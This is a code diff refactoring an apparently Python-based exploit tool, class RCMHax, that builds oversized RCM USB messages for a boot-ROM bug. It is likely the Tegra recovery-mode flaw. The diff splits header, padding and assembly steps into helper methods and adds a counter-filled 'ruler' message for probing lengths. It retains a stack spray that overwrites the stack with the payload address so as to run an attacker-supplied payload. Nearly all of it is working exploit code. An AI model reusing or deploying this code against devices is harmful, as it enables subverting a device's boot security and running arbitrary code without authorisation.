@@ -132,13 +132,12 @@ class RCMHax(ABC):
 
         return self.backend.trigger_vulnerability(length)
 
-    def create_rcm_message(self, intermezzo_path, payload_path):
-        """ Creates the RCM message containing the payload and stack overwrite"""
-######## RCM HEADER ############################################################
+    def rcm_message_header(self, payload_length):
+        """ Creates the RCM message header"""
         # The max payload size depends on the address of the RCM Payload buffer
         # Add the RCM header size to USB transfer size.
         # Substract 16. IDK they all do it. Test without it.
-        rcm_payload_length  = (self.IRAM_END - self.RCM_PAYLOAD_ADDR) + self.RCM_HEADER_SIZE - 16
+        rcm_payload_length = payload_length + self.RCM_HEADER_SIZE - 16
         if self.debug:
             print("RCM payload length: " , rcm_payload_length)
 
@@ -146,6 +145,51 @@ class RCMHax(ABC):
         # Fill up the RCM header to RCM_HEADER_SIZE otherwise the start of the payload is copied to thhexe RCM command buffer
         rcm_header += b'\0' * (self.RCM_HEADER_SIZE - len(rcm_header))
 
+        return rcm_header
+
+
+    def rcm_message_assemble(self, rcm_header, rcm_payload):
+        rcm_message = rcm_header + rcm_payload
+
+        if self.debug:
+            print("actual message length: " , len(rcm_message))
+            f_rcm_message = open("tmp_rcm_message.bin", "wb")
+            f_rcm_message.write(rcm_message)
+            f_rcm_header = open("tmp_rcm_header.bin", "wb")
+            f_rcm_header.write(rcm_header)
+            f_rcm_payload = open("tmp_rcm_payload.bin", "wb")
+            f_rcm_payload.write(rcm_payload)
+
+        return rcm_message
+
+
+    def rcm_message_pad_xfer(self, rcm_header, rcm_payload):
+        """ Pad the payload to fill a USB request exactly, so we don't send a short packet
+        and lose track of the current usb USB DMA buffer. """
+        payload_length = len(rcm_header + rcm_payload) #pad the RCM message full USB buffer.
+        if (payload_length % self.USB_XFER_MAX) != 0: #don't pad if we already end at correct alignment
+            padding_size   = self.USB_XFER_MAX - (payload_length % self.USB_XFER_MAX)
+            rcm_payload += (b'\0' * padding_size)
+
+        return self.rcm_message_assemble(rcm_header, rcm_payload)
+
+
+    def create_rcm_message_ruler(self, payload_length):
+        rcm_header = self.rcm_message_header(payload_length)
+        rcm_payload = bytes()
+
+        counter = 1;
+        while (len(rcm_payload) + len(rcm_header)) < payload_length:
+            rcm_payload += counter.to_bytes(4, byteorder='little')
+            counter += 1
+
+        return self.rcm_message_assemble(rcm_header, rcm_payload)
+
+
+    def create_rcm_message(self, intermezzo_path, payload_path):
+        """ Creates the RCM message containing the payload and stack overwrite"""
+        # Fill up the RCM header to RCM_HEADER_SIZE otherwise the start of the payload is copied to thhexe RCM command buffer
+        rcm_header = self.rcm_message_header(self.IRAM_END - self.RCM_PAYLOAD_ADDR)
 
 ######## DECIDE IF INTERMEZZO IS NEEDED ########################################
         with open(payload_path, "rb") as f:
@@ -168,6 +212,7 @@ class RCMHax(ABC):
             repeat_count = int((self.STACK_SPRAY_END - self.STACK_SPRAY_START) / 4)
             if self.debug:
                 print("Number of stack sprays: ", repeat_count)
+            #stack_spray = (self.COPY_BUFFER_ADDRESSES[1].to_bytes(4, byteorder='little') * repeat_count)
             stack_spray = (self.RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)
             rcm_payload += stack_spray
 
@@ -188,6 +233,9 @@ class RCMHax(ABC):
             assert(len(payload) < (payload_part1_max_size+payload_part2_max_size))
 ######## INTERMEZZO ############################################################
             # This is the start of the RCM payload buffer.
+            if not os.path.isfile(intermezzo_path):
+                print("Could not find the intermezzo interposer and is required for this payload. Did you build it?")
+                sys.exit(-1)
             with open(intermezzo_path, "rb") as f:
                 intermezzo      = f.read()
 
@@ -241,21 +289,4 @@ class RCMHax(ABC):
             assert(0)
 
 ######## PAD TO USB_XFER_MAX ###################################################
-        # Pad the payload to fill a USB request exactly, so we don't send a short
-        # packet and lose track of the current usb USB DMA buffer.
-        payload_length = len(rcm_header + rcm_payload) #pad the RCM message full USB buffer.
-        if (payload_length % self.USB_XFER_MAX) != 0: #don't pad if we already end at correct alignment
-            padding_size   = self.USB_XFER_MAX - (payload_length % self.USB_XFER_MAX)
-            rcm_payload += (b'\0' * padding_size)
-
-        rcm_message = rcm_header + rcm_payload
-
-        if self.debug:
-            f_rcm_message = open("rcm_message.bin", "wb")
-            f_rcm_message.write(rcm_message)
-            f_rcm_header = open("rcm_header.bin", "wb")
-            f_rcm_header.write(rcm_header)
-            f_rcm_payload = open("rcm_payload.bin", "wb")
-            f_rcm_payload.write(rcm_payload)
-
-        return rcm_message
+        return self.rcm_message_pad_xfer(rcm_header, rcm_payload)
